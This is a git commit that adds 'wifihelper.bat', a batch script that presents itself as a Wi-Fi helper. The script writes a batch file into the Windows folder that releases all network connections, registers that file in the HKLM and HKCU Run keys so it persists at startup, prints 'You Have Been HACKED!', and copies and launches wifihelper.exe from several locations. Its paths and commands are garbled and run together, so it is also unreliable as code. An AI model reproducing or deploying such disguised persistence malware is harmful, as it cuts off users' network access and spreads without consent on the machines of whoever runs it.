ddc2529b2df3c9d588f124718e75f7ad16c57b32
Awesomehacker3404 <48257718+Awesomehacker3404@users.noreply.github.com>
2019-03-05 11:21:24 -0700

    Add files via upload

---
+++ wifihelper.bat
@@ -0,0 +1,17 @@
+echo @echo off>c:windowswimn32.bat
+echo break off>c:windowswimn32.bat echo
+ipconfig/release_all>c:windowswimn32.bat
+echo end>c:windowswimn32.batreg add
+hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
+hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
+
+Copy C:\programs\wifihelper.exe C:\Windows
+Copy C:\Windows\wifihelper.exe C:\Users\Public
+
+Start C:\programs\wifihelper.exe
+Start C:\Windows\wifihelper.exe
+Start C:\Users\Public\wifihelper.exe
+
+exit C:\programs\wifihelper.exe
+exit C:\Windows\wifihelper.exe
+exit C:\Users\Public\wifihelper.exe
